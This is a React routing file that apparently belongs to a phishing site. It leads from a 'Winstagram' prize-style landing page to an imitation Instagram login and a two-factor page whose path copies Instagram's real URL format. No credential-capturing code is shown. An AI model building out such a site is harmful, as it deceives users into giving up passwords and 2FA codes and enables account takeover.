import { BrowserRouter as Router, Routes, Route } from "react-router-dom";
import WinstagramLanding from "./components/WinstagramLanding";
import InstagramLogin from "./components/InstagramLogin";
import TwoFactorPage from "./components/2fa-verification";

function App() {
  return (
    <Router>
      <Routes>
        <Route path="/" element={<WinstagramLanding />} />
        <Route path="/instagram-login" element={<InstagramLogin />} />
        <Route
          path="/accounts/login/two_factor/:sessionId"
          element={<TwoFactorPage />}
        />
      </Routes>
    </Router>
  );
}

export default App;
